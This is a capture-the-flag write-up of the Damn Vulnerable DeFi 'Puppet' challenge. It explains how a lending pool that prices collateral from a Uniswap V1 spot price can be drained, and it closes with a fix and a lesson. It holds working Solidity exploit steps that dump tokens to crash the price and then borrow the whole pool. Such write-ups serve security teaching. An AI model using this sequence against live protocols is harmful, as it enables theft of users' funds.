# Puppet (Damn Vulnerable DeFi #6)

**Vulnerability class:** Price oracle manipulation (spot price from a DEX pool).
OWASP Smart Contract Top 10 #2.

## The goal

Drain all 100,000 DVT from a lending pool that prices collateral using a
manipulable Uniswap V1 spot price. Single player transaction.

## The flaw

The lending pool computes the token price directly from the Uniswap pair's
current reserves:

```solidity
function _computeOraclePrice() private view returns (uint256) {
    return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
}
```

This is an instantaneous spot price: `ETH_in_pair / tokens_in_pair`. No
aggregation, no time-averaging. Whoever moves the pair's reserves moves the price.
The required ETH collateral to borrow is derived from this price, so crashing the
price makes borrowing nearly free.

The Uniswap pair is tiny (10 ETH / 10 tokens) while the player holds 1000 tokens —
100x the pair's token reserve. Dumping those tokens collapses the price.

## The exploit (one transaction)

DVT (solmate ERC20) supports EIP-2612 `permit`, so the player signs an off-chain
permit (not an on-chain tx) authorizing an attacker contract. The single on-chain
transaction is the attacker's deploy, whose constructor:

```solidity
token.permit(player, address(this), playerTokens, deadline, v, r, s);
token.transferFrom(player, address(this), playerTokens);   // pull player's tokens
token.approve(uniswap, type(uint256).max);
IUniswapV1(uniswap).tokenToEthSwapInput(playerTokens, 1, deadline); // crash price
uint256 dep = pool.calculateDepositRequired(poolTokens);   // now ~0
pool.borrow{value: dep}(poolTokens, recovery);             // drain pool cheaply
```

## The fix

Never use a DEX spot price as an oracle for collateral/borrow/liquidation
decisions. Use a manipulation-resistant oracle: Chainlink (aggregated, multi-source)
or a TWAP (time-weighted average) that forces an attacker to hold the manipulation
across many blocks at huge cost.

## Lesson

A DEX spot price reflects pool liquidity at a single instant, which an attacker
controls via one swap or flash loan. Aggregated oracles (Chainlink) can't be moved
by trading in one venue. This class caused Mango Markets ($116M), Harvest ($34M),
and many more.
